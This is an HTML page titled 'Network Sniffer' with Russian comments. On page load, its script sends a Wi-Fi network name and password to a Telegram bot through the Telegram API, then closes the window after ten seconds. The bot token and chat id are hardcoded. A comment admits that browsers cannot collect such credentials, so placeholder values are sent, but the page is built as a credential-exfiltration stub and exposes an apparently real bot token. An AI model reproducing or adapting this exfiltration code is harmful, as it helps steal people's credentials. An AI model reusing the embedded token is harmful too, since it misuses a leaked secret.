<!DOCTYPE html>
<html>
<head>
    <title>Network Sniffer</title>
    <script>
        // Функция для отправки сообщения в Telegram
        function sendToTelegram(message) {
            const botToken = '7341685493:AAGsKsTZfF6LPql4R6fJJQ9qiUx3Mq1L5eQ';
            const chatId = '7406507427';
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => response.json())
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Функция для сбора SSID и пароля
        function collectData() {
            // Пример данных (фактически сбор SSID и паролей невозможен из браузера)
            const ssid = 'ExampleSSID';
            const password = 'ExamplePassword';
            const message = `SSID: ${ssid}\nPassword: ${password}`;
            sendToTelegram(message);
        }

        window.onload = () => {
            collectData();
            setTimeout(() => {
                window.close();  // Закрытие окна после небольшой задержки
            }, 10000);  // Задержка 10 секунд
        }
    </script>
</head>
<body>
    <h1>Network Sniffer</h1>
    <p>Сбор данных...</p>
</body>
</html>
